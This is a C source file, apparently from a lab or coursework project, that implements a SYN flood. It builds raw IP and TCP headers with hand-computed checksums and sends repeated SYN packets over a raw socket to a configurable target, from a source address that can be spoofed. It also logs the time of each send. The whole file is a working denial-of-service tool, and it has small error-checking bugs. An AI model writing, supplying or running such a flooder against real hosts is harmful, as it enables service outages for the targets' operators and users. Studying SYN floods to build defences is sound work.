#include "Attack.h"


void set_ip_layer(struct iphdr *ip_header)
{
    ip_header->ihl = 5;
    ip_header->version = 4;
    ip_header->tos = 0;
    ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip_header->id = htons(1);
    ip_header->frag_off = 0;
    ip_header->ttl = 64;
    ip_header->protocol = IPPROTO_TCP;
    ip_header->check = 0;
    ip_header->saddr = inet_addr(S_IP);
    ip_header->daddr = inet_addr(D_IP);

    uint32_t checksum = 0;
    uint16_t *ipPtr = (uint16_t*)ip_header;

    int i = 0;
    for(i = 0; i < sizeof(struct iphdr)/2; i++)
    {
        checksum += *(ipPtr++);
    }

    while(checksum >> 16)
    {
        checksum = (checksum & 0xFFFF) + (checksum >> 16);
    }

    ip_header->check = (uint16_t)(~checksum);   
}


void set_tcp_layer(struct tcphdr *tcp_header)
{
    tcp_header->source = htons(S_PORT);
    tcp_header->dest = htons(D_PORT);
    tcp_header->seq = htonl(0);
    tcp_header->ack_seq = 0;
    tcp_header->res1 = 0;
    tcp_header->doff = 5;
    tcp_header->fin = 0;
    tcp_header->syn = 1;
    tcp_header->rst = 0;
    tcp_header->psh = 0;
    tcp_header->ack = 0;
    tcp_header->urg = 0;
    tcp_header->res2 = 0;
    tcp_header->window = htons(8192);
    tcp_header->check = 0;
    tcp_header->urg_ptr = 0;

    uint32_t checksum = 0;
    uint16_t *tcpPtr = (uint16_t*)tcp_header;

    checksum += (inet_addr(S_IP) >> 16) & 0xFFFF;
    checksum += (inet_addr(S_IP) & 0xFFFF);
    checksum += (inet_addr(D_IP) >> 16) & 0xFFFF;
    checksum += inet_addr(D_IP) & 0xFFFF;
    checksum += htons(IPPROTO_TCP);
    checksum += htons(sizeof(struct tcphdr));

    int i = 0;
    for(i = 0; i < sizeof(struct tcphdr)/2; i++)
    {
        checksum += *(tcpPtr++);
    }

    while(checksum >> 16)
    {
        checksum = (checksum & 0xFFFF) + (checksum >> 16);
    }

    tcp_header->check = (uint16_t)(~checksum);
}



int main(int argc, char **argv)
{
    int sock = 0;
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(!sock)
    {
        fprintf(stderr, "socket() failed\n");
        exit(errno);
    }

    FILE *file = NULL;
    file = fopen(SYN_TIMES_FILE, "w");
    if(!file)
    {
        fprintf(stdout, "foepn() failed\n");
        close(sock);
        exit(errno);
    }

    struct iphdr ip_header = {0};
    memset(&ip_header, 0, sizeof(struct iphdr));
    set_ip_layer(&ip_header);

    struct tcphdr tcp_header = {0};
    memset(&tcp_header, 0, sizeof(struct tcphdr));
    set_tcp_layer(&tcp_header);

    struct sockaddr_in target_addr = {0};
    memset(&target_addr, 0, sizeof(struct sockaddr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = ip_header.daddr;
    target_addr.sin_port = htons(D_PORT);

    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
    memset(packet, 0, sizeof(packet));
    memcpy(packet, &ip_header, sizeof(struct iphdr));
    memcpy(packet + sizeof(struct iphdr), &tcp_header, sizeof(struct tcphdr));

    struct timeval before_send = {0}, after_send = {0};
    memset(&before_send, 0, sizeof(struct timeval));
    memset(&after_send, 0, sizeof(struct timeval));


    double avg = 0.0;
    size_t bytes_sent = 0;

    int i = 0, j = 0;
    for(i = 0; i < NUM_ITERATIONS; i++)
    {
        for(j = 0; j < NUM_PACKETS; j++)
        {   
            gettimeofday(&before_send, NULL);
            bytes_sent = sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
            gettimeofday(&after_send, NULL);

            if(bytes_sent < 0)
            {
                fprintf(stderr, "sendto() failed\n");
                exit(errno);
            }

            avg += ((after_send.tv_sec - before_send.tv_sec) + ((after_send.tv_usec - before_send.tv_usec) / 1000000.0));

            fprintf(file, "%d %f\n", ((i * NUM_PACKETS) + j), ((after_send.tv_sec - before_send.tv_sec) + ((after_send.tv_usec - before_send.tv_usec) / 1000000.0)));
            fflush(file);
        }
        fprintf(stdout, "Sent %d packets\n", ((i + 1) * NUM_PACKETS));
    }

    avg /= (NUM_ITERATIONS * NUM_PACKETS);
    fprintf(file, "%f", avg);
    fflush(file);

    fclose(file);
    
    return 0;
}